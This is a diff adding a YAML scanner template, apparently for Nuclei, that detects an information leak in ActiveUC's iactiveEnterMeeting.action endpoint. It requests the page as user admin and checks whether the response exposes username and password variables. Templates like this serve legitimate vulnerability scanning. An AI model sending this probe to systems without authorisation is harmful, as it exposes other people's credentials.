@@ -1,0 +1,26 @@
+id: activeuc-info-leak
+info:
+  name: ActiveUC iactiveEnterMeeting Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/acenter/iactiveEnterMeeting.action?roomid=1&username=admin"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "var username="
+          - "var password="
+          - "ActiveMeeting.exe"
+      - type: word
+        part: body
+        words:
+          - "登陆会议"
+          - "ActiveMeeting.exe"
